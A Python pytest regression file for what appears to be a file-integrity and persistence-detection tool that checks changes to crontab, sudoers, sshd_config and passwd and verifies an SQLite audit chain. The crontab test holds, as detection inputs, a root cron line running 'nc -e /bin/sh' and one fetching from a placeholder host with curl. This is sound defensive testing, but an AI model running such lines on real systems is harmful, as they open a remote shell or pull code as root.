"""Regression coverage for final correctness fixes."""
import os
import sqlite3
from pathlib import Path

from forace.analyzers import analyze_crontab, analyze_passwd, analyze_sshd, analyze_sudoers
from forace.detection import compare_scans
from forace.store import (
    clear_inactive_findings, initialize_database, store_finding_once, verify_audit_chain,
)


def _entry(text, *, mode=0o644):
    import hashlib
    return {"sha256": hashlib.sha256(text.encode()).hexdigest(), "snapshot": text,
            "size": len(text), "mode": mode, "uid": 1000, "gid": 1000}


def test_scan_errors_are_findings_and_do_not_hide_deleted_file():
    old = {"home/user/.ssh/authorized_keys": _entry("old-key")}
    current = {"files": {}, "errors": {"home/user/.ssh/authorized_keys": "Symbolic links are not supported"}}
    findings = compare_scans({"files": old}, current)
    kinds = {item["change_type"] for item in findings}
    assert "deleted" in kinds
    assert "symlink_replaced" in kinds
    assert all(item["severity"] for item in findings if item["change_type"] == "symlink_replaced")


def test_scan_error_for_new_symlink_and_unreadable_file():
    baseline = {"files": {}}
    for message, expected in [("Symbolic links are not supported", "symlink_added"),
                              ("Permission denied", "unreadable"),
                              ("File changed while it was being scanned", "changed_during_scan")]:
        findings = compare_scans(baseline, {"files": {}, "errors": {"etc/new.conf": message}})
        assert findings[0]["change_type"] == expected
        assert findings[0]["severity"]


def test_sudoers_include_directive_is_active():
    before = "root ALL=(ALL) ALL\n"
    after = before + "#includedir /tmp/x\n"
    assert analyze_sudoers(before, after)["admin_privileges"] == []
    findings = compare_scans({"files": {"etc/sudoers": _entry(before)}},
                             {"files": {"etc/sudoers": _entry(after)}, "errors": {}})
    assert any(item["file_path"] == "etc/sudoers" for item in findings)


def test_cron_token_matching_does_not_match_rsync_sync_or_once():
    old = "SHELL=/bin/sh\n"
    for command in ("rsync -a /a /b", "sync", "once"):
        result = analyze_crontab(old, old + f"* * * * * root {command}\n")
        assert not result["suspicious"]
    assert analyze_crontab(old, old + "* * * * * root nc -e /bin/sh x 1\n")["suspicious"]
    assert analyze_crontab(old, old + "* * * * * root curl http://example.invalid/x\n")["suspicious"]


def test_sshd_accepts_equals_and_quoted_values():
    assert analyze_sshd("PermitRootLogin no\n", 'PermitRootLogin="yes"\n') == ["PermitRootLogin=yes"]
    assert analyze_sshd("PasswordAuthentication no\n", "PasswordAuthentication = yes\n") == ["PasswordAuthentication=yes"]


def test_any_account_transition_to_login_shell_is_detected():
    old = "svc-data:x:1001:1001::/srv/data:/sbin/nologin\n"
    new = "svc-data:x:1001:1001::/srv/data:/bin/bash\n"
    assert analyze_passwd(old, new)["service_shell"] == ["svc-data"]


def test_findings_are_deduped_only_while_continuously_active(tmp_path):
    db = tmp_path / "audit.db"
    initialize_database(db)
    finding = {"file_path": "etc/ssh/sshd_config", "change_type": "PermitRootLogin=yes",
               "rule_id": "R01", "severity": "High", "attack_id": "T1021.004",
               "explanation": "test"}
    fingerprint = "a" * 64
    assert store_finding_once(db, finding, fingerprint)
    assert not store_finding_once(db, finding, fingerprint)
    clear_inactive_findings(db, [])
    assert store_finding_once(db, finding, fingerprint)
    assert verify_audit_chain(db)["status"] == "valid"


def test_findings_table_deletion_invalidates_audit_verification(tmp_path):
    db = tmp_path / "audit.db"
    initialize_database(db)
    finding = {"file_path": "etc/ssh/sshd_config", "change_type": "modified",
               "rule_id": None, "severity": "Medium", "attack_id": None,
               "explanation": "changed"}
    store_finding_once(db, finding, "b" * 64)
    assert verify_audit_chain(db)["status"] == "valid"
    with sqlite3.connect(db) as connection:
        connection.execute("DELETE FROM findings")
    result = verify_audit_chain(db)
    assert result["status"] == "invalid"
    assert "findings table" in result["message"].lower()


def test_relative_rules_path_resolves_from_project_root_outside_cwd(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    before = {"etc/ssh/sshd_config": _entry("PermitRootLogin no\n")}
    after = {"etc/ssh/sshd_config": _entry("PermitRootLogin yes\n")}
    findings = compare_scans({"files": before}, {"files": after, "errors": {}})
    assert any(item["rule_id"] == "R01" for item in findings)


def test_findings_without_any_audit_records_are_invalid(tmp_path):
    db = tmp_path / "audit.db"
    initialize_database(db)
    with sqlite3.connect(db) as connection:
        connection.execute(
            "INSERT INTO findings (timestamp_utc, file_path, change_type) VALUES "
            "('2026-01-01T00:00:00+00:00', 'etc/passwd', 'modified')"
        )
    assert verify_audit_chain(db)["status"] == "invalid"
